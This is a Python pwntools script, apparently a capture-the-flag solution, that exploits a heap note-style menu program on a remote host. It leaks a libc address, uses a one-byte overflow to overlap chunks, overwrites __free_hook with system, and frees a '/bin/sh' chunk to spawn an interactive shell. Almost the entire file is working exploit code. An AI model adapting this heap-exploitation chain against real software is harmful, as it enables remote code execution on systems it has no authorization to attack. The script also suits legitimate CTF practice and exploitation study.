from pwn import *

#p=process('./p')
p=remote('82.196.10.106',29099)

sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
go = lambda : p.interactive()

def add(size,num,name,desc):
    sla('>','1')
    sla('Length:',str(size))
    sla('Number:',str(num))
    sa('Name:',name)
    sa('Desc',desc)

def show(idx):
    sla('>','2')
    sla('Index',str(idx))

def rem(idx):
    sla('>','3')
    sla('Index',str(idx))

for i in range(9):
    add(0x90,1,'HHRO','HHRO'+str(i))

for i in range(8):
    rem(i)

#[1]LEAK
add(0x40,1,'HHRO','1')
show(0)
p.recvuntil('ion : ')
leak = u64(p.recvn(6)+'\x00'*2)
lb = leak-0x3ebd31
system = lb + 0x4f440
fhook= lb+0x3ed8e8

success(hex(lb))
rem(0)
rem(8)

#[2]EXPLOIT
add(0x88,1,'HHRO','HHRO')
add(0x30,1,'HHRO','HHRO2')
rem(0)
pay = 'A'*0x80+p64(0x90)+'\x70'
add(0x88,1,'HHRO',pay)
rem(1)

add(0x30,1,'HHRO','HHRO3')
rem(1)

add(0x60,1,'HHRO',"B"*0x40+p64(fhook))

add(0x30,1,'HHRO',"B")
add(0x30,1,'HHRO',p64(system))

add(0x20,1,'/bin/sh','/bin/sh')
rem(4)
go()
